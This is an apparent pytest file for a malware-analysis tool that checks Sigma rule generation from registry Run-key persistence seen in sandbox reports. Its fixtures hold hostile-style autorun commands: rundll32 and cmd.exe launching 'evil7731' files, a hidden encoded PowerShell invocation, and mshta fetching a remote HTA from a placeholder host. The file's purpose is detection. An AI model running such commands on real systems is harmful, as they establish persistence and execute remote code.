"""An autorun's data is selected by the paths it names.

The data a persistence payload or a written registry value holds was cut to
the first program name it held: a payload of ``svchost.exe`` in a user's
folder was left out as Windows' own file in Windows' folder, and
``rundll32.exe <dll>,Start`` or ``cmd.exe /c <program>`` gave the system
program alone, left out, and the file the sample registered was lost. Every
program and file path the data names is now read by the reader of a command
line's paths (``sandbox_report.command_line_paths``) and asked with its folder:
a program of the sample's own is the process's image; a system program
followed by a path of the sample's own selects that path in the field the
draft's log source records the data in; data naming nothing specific selects
no image, and the value-named key still stands. Two values written to one
key each keep their name and data, from the sandbox's tool to the rule; only
a write names a program, never a read.
"""

from __future__ import annotations

from typing import Any

import pytest

from malspark.reporting.builder import MalwareReportBuilder
from malspark.reporting.models import (
    ConsolidatedIOC,
    DynamicBehavior,
    FileHashes,
    MalwareReport,
    PersistenceMechanism,
    RegistryMod,
    SampleIdentity,
)
from malspark.reporting.stated_host_values import benign_catalogue
from tests.unit._ledger_helpers import ledger_from_sandbox
from tests.unit.reporting.test_a_sigma_selection_that_stands_alone_holds_a_specific_value import (
    _report,
    _sigma,
)

RUN = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
RUN_TARGET = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"


def _sandboxed(calls: list[tuple[str, dict[str, str]]]) -> MalwareReport:
    """A report built from a sandbox's registry calls, through the tools a dynamic analyst calls."""
    sandbox = {
        "target": {"file": {"sha256": "c" * 64, "name": "s.exe"}},
        "behavior": {
            "processes": [{"name": "s.exe", "pid": 1234, "ppid": 1}],
            "calls": [{"api": api, "pid": 1234, "arguments": [args]} for api, args in calls],
        },
    }
    report = MalwareReportBuilder(
        file_hash="c" * 64,
        file_name="s.exe",
        sample_path=None,
        sandbox_report=sandbox,
        reports={},
        isr_reports={},
        stix_output={"objects": []},
        run_summary={},
        discussion_history=[],
        final_decision="Malware",
        overall_confidence=0.9,
        judge_assessment=None,
        malware_category="ransomware",
        evidence_ledger=ledger_from_sandbox(sandbox),
    ).build_deterministic()
    return MalwareReportBuilder.attach_detection_signatures(report)


def _written(name: str, data: str) -> tuple[str, dict[str, str]]:
    return ("RegSetValueExW", {"FullName": RUN, "ValueName": name, "Buffer": data})


def _detection(report: MalwareReport) -> dict[str, Any]:
    (body,) = _sigma(report)
    return dict(body["detection"])


class TestTheReaderOfACommandLine:
    def test_reads_a_quoted_path_whole_and_each_word_between_spaces_and_commas(self) -> None:
        from malspark.schemas.sandbox_report import command_line_paths

        assert command_line_paths(
            '"C:\\Program Files\\Vendor7731\\up7731.exe" /s C:\\x\\a.dll,Start'
        ) == ["C:\\Program Files\\Vendor7731\\up7731.exe", "/s", "C:\\x\\a.dll", "Start"]


class TestAWrittenValue:
    def test_whose_program_is_its_own_in_a_user_folder_selects_it_with_its_folder(self) -> None:
        report = _sandboxed([_written("m", "C:\\Users\\a\\AppData\\Roaming\\svchost.exe")])

        assert _detection(report)["selection_persistence"] == {
            "Image|endswith": ["\\AppData\\Roaming\\svchost.exe"]
        }
        (rule,) = [r for r in report.detection_signatures if r.kind == "sigma"]
        assert all("in the folder Windows keeps it in" not in v.why for v in rule.values_left_out)

    @pytest.mark.parametrize(
        ("data", "selected"),
        [
            ("rundll32.exe C:\\Users\\a\\AppData\\evil7731.dll,Start", "\\evil7731.dll"),
            ("cmd.exe /c C:\\ProgramData\\evil7731.exe", "\\evil7731.exe"),
            ("powershell -File C:\\Users\\a\\x7731.ps1", "\\x7731.ps1"),
        ],
    )
    def test_run_by_a_system_program_selects_the_path_it_names_in_the_data(
        self, data: str, selected: str
    ) -> None:
        detection = _detection(_sandboxed([_written("r", data)]))

        assert detection["selection_registry"] == {"TargetObject|contains": [f"{RUN_TARGET}\\r"]}
        assert detection["selection_payload"] == {"Details|contains": [selected]}
        assert "selection_persistence" not in detection

    @pytest.mark.parametrize(
        "data",
        ["powershell -w hidden -enc SQBFAFgA", '"C:\\Windows\\System32\\mshta.exe" http://x/a.hta'],
    )
    def test_naming_nothing_specific_leaves_the_value_named_key(self, data: str) -> None:
        detection = _detection(_sandboxed([_written("p", data)]))

        assert detection == {
            "selection_registry": {"TargetObject|contains": [f"{RUN_TARGET}\\p"]},
            "condition": "selection_registry",
        }

    def test_a_quoted_program_under_a_folder_with_a_space_is_its_image(self) -> None:
        detection = _detection(
            _sandboxed([_written("u", '"C:\\Program Files\\Vendor7731\\up7731.exe" /s')])
        )

        assert detection["selection_persistence"] == {"Image|endswith": ["\\up7731.exe"]}


class TestTwoValuesWrittenToOneKey:
    def test_each_keeps_its_name_and_data_through_the_record_and_the_rule(self) -> None:
        report = _sandboxed(
            [
                _written("alpha", "C:\\Users\\a\\AppData\\Roaming\\alpha7731.exe"),
                _written("beta", "C:\\Users\\a\\AppData\\Roaming\\beta7731.exe"),
            ]
        )

        assert report.dynamic is not None
        assert [(m.value_name, m.new_value) for m in report.dynamic.registry_mods] == [
            ("alpha", "C:\\Users\\a\\AppData\\Roaming\\alpha7731.exe"),
            ("beta", "C:\\Users\\a\\AppData\\Roaming\\beta7731.exe"),
        ]
        detection = _detection(report)
        assert detection["selection_registry"] == {
            "TargetObject|contains": [f"{RUN_TARGET}\\alpha", f"{RUN_TARGET}\\beta"]
        }
        assert detection["selection_persistence"] == {
            "Image|endswith": ["\\alpha7731.exe", "\\beta7731.exe"]
        }


class TestAnAnalystsPayload:
    def test_run_by_a_system_program_selects_its_file_on_the_command_line(self) -> None:
        report = _report(
            [],
            persistence=[
                PersistenceMechanism(
                    kind="registry_run",
                    target="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    payload="rundll32.exe C:\\Users\\a\\evil7731.dll,Start",
                )
            ],
        )

        (body,) = _sigma(report)
        assert body["logsource"] == {"product": "windows", "category": "process_creation"}
        assert body["detection"] == {
            "selection_payload": {"CommandLine|contains": ["\\evil7731.dll"]},
            "condition": "selection_payload",
        }

    def test_in_a_user_folder_under_a_name_windows_ships_is_selected_with_its_folder(
        self,
    ) -> None:
        report = _report(
            [],
            persistence=[
                PersistenceMechanism(
                    kind="registry_run",
                    target="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    payload="C:\\Users\\a\\AppData\\Roaming\\svchost.exe",
                )
            ],
        )

        (body,) = _sigma(report)
        assert body["detection"]["selection_persistence"] == {
            "Image|endswith": ["\\AppData\\Roaming\\svchost.exe"]
        }


class TestOnlyAWriteNamesAProgram:
    def test_data_a_sample_read_from_a_common_key_names_none(self) -> None:
        report = _sandboxed(
            [
                (
                    "RegQueryValueExW",
                    {
                        "FullName": RUN,
                        "ValueName": "q",
                        "Data": "C:\\Users\\a\\AppData\\Roaming\\evil7731.exe",
                    },
                )
            ]
        )

        assert _sigma(report) == []

    def test_data_under_a_common_key_no_row_admits_names_none(self) -> None:
        # The IOC table as a stored report holds it, read back by the replay:
        # no row of it names the key the value was written under.
        report = MalwareReport(
            identity=SampleIdentity(hashes=FileHashes(sha256="7" * 64)),
            verdict="Malware",
            dynamic=DynamicBehavior(
                registry_mods=[
                    RegistryMod(
                        hive="HKCU",
                        key=RUN,
                        operation="modify",
                        value_name="w",
                        new_value="C:\\Users\\a\\AppData\\Roaming\\evil7731.exe",
                    )
                ]
            ),
            consolidated_iocs=[
                ConsolidatedIOC(
                    type="File path",
                    kind="path",
                    value="C:\\Users\\a\\other7731.txt",
                    source="sandbox",
                )
            ],
        )

        assert _sigma(MalwareReportBuilder.attach_detection_signatures(report)) == []

    def test_a_payload_under_a_common_key_no_row_admits_names_none(self) -> None:
        # A mechanism whose key has no row of its own: the table carries a
        # Run key's mechanism only, and no sandbox wrote this one.
        report = _report(
            [],
            persistence=[
                PersistenceMechanism(
                    kind="winlogon_helper",
                    target="HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                    payload="C:\\Users\\a\\AppData\\Roaming\\evil7731.exe",
                )
            ],
        )

        assert _sigma(report) == []


@pytest.mark.parametrize("form", ["{}", "%APPDATA%\\{}", "C:\\Users\\a\\{}", "{} /c x7731"])
def test_no_written_value_selects_a_name_windows_ships_alone(form: str) -> None:
    names = sorted(benign_catalogue().system_binaries)

    report = _sandboxed([_written(f"v{at}", form.format(name)) for at, name in enumerate(names)])

    for body in _sigma(report):
        printed = {
            value.lower().lstrip("\\")
            for name, selection in body["detection"].items()
            if name.startswith("selection_")
            for values in selection.values()
            if isinstance(values, list)
            for value in values
        }
        assert not printed & set(names)
